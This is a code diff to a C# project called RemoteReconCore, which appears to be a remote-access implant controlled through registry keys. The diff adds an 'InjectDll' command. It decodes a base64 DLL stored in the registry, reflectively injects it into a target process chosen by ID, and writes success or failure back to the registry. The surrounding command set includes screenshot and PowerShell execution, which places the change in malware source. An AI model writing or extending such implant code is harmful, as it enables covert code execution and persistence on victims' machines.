@@ -104,6 +104,17 @@ namespace RemoteReconCore
                         command = new KeyValuePair<int, object>(0, "");
                         result = new KeyValuePair<int, string>(0, "");
                         break;
+                    case (int)Cmd.InjectDll:
+#if DEBUG 
+                        Console.WriteLine("Writing DllInject command result");
+#endif
+                        rrbase.SetValue(resultkey, result.Key, RegistryValueKind.DWord);
+                        rrbase.SetValue(runkey, result.Value, RegistryValueKind.String);
+                        rrbase.SetValue(commandkey, 0);
+                        rrbase.SetValue(argumentkey, "");
+                        command = new KeyValuePair<int, object>(0, "");
+                        result = new KeyValuePair<int, string>(0, "");
+                        break;
                     default:
                         break;
                 }
@@ -162,6 +173,19 @@ namespace RemoteReconCore
                     result = new KeyValuePair<int, string>(4, err);
                 }
             }
+            else if((int)Cmd.InjectDll == command.Key)
+            {
+#if DEBUG 
+                Console.WriteLine("Received DllInject command");
+#endif
+                mod = Convert.FromBase64String((string)rrbase.GetValue(modkey));
+
+                ReflectiveInjector.Injector obj = new ReflectiveInjector.Injector(Convert.ToInt32(command.Value), mod);
+                if (!obj.Inject())
+                    result = new KeyValuePair<int, string>(6, Convert.ToBase64String(Encoding.ASCII.GetBytes("DllInject failed")));
+                else
+                    result = new KeyValuePair<int, string>(0, Convert.ToBase64String(Encoding.ASCII.GetBytes("DllInject success")));
+            }
         }
 
         public static int sleep = 5;
@@ -181,7 +205,7 @@ namespace RemoteReconCore
             ScreenShotFailed = 3,
             PSFailed = 4,
             RevertFailed = 5,
-            AssemblyFailed = 6
+            InjectDll = 6
         }
 
         public enum Cmd : int
@@ -192,7 +216,7 @@ namespace RemoteReconCore
             Screenshot = 3,
             PowerShell = 4,
             Revert = 5,
-            Assembly = 6
+            InjectDll = 6
         }
         
 
